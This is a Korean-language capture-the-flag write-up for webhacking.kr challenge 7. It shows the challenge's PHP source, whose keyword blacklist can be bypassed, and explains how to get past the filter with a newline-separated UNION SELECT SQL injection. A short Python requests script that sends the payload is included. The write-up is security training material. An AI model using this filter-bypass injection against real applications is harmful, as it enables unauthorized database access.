================================================================================================================
[webhacking.kr] 07
================================================================================================================

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5;
        }
        step0 -> step1[label="val='+'1)%0aunion%0aselect%0a3-1%23)",arrowhead="normal"];
        step3 -> step2[label="@solve",arrowhead="normal"];
    }

|

Source analysis
================================================================================================================

입력 부분: $_GET[val]

출력 부분: @solve();

.. code-block:: php
    
    <html>
    <head>
    <title>Challenge 7</title>
    </head>
    <body>
    <!--
    db에는 val=2가 존재하지 않습니다.
    union을 이용하세요
    -->
    <?
    $answer = "????";

    $go=$_GET[val];

    if(!$go) { 
        echo("<meta http-equiv=refresh content=0;url=index.php?val=1>"); }

    $ck=$go;

    $ck=str_replace("*","",$ck);
    $ck=str_replace("/","",$ck);

    echo("<html><head><title>admin page</title></head><body bgcolor='black'><font size=2 color=gray><b><h3>Admin page</h3></b><p>");

    if(eregi("--|2|50|\+|substring|from|infor|mation|lv|%20|=|!|<>|sysM|and|or|table|column",$ck)) 
        exit("Access Denied!");

    if(eregi(' ',$ck)) { 
        echo('cannot use space'); 
        exit(); }

    $rand=rand(1,5);
    if($rand==1)
    {
        $result=@mysql_query("select lv from lv1 where lv=($go)") or die("nice try!");
    }
    if($rand==2)
    {
        $result=@mysql_query("select lv from lv1 where lv=(($go))") or die("nice try!");
    }
    if($rand==3)
    {
        $result=@mysql_query("select lv from lv1 where lv=((($go)))") or die("nice try!");
    }
    if($rand==4)
    {
        $result=@mysql_query("select lv from lv1 where lv=(((($go))))") or die("nice try!");
    }
    if($rand==5)
    {
        $result=@mysql_query("select lv from lv1 where lv=((((($go)))))") or die("nice try!");
    }

    $data=mysql_fetch_array($result);
    if(!$data[0]){ 
        echo("query error");
        exit(); }
    if($data[0]!=1 && $data[0]!=2) { 
        exit(); }
    if($data[0]==1)
    {
        echo("<input type=button style=border:0;bgcolor='gray' value='auth' onclick=
        alert('Access_Denied!')><p>");
        echo("<!-- admin mode : val=2 -->");
    }
    if($data[0]==2)
    {
        echo("<input type=button style=border:0;bgcolor='gray' value='auth' onclick=
        alert('Congratulation')><p>");
        @solve();
    } 
    </body>
    </html>

|

eregi 함수 우회
================================================================================================================

입력 부분이 $_GET[val]이고, 해당 입력값에 상관없이 랜덤하게 쿼리가 실행되는 것을 볼 수 있다.
eregi로 필터링되는 함수를 제외하여 rand가 1일 때 실행할 수 있는 쿼리문을 작성해보자.

.. code-block:: sql

    select lv from lv1 where lv=($_GET[val])

해당 소스 코드로 계속해서 request를 날리면 해결할 수 있다.

.. code-block:: python

    import requests

    url = "http://webhacking.kr/challenge/web/web-07/index.php?val='+'1)%0aunion%0aselect%0a3-1%23)"
    cookies = {
        "PHPSESSID":"9johqp6c81c5hf11lkomnghhn6"
    }
    
    r = requests.get(url, cookies = cookies, verify=False)

    print r.content
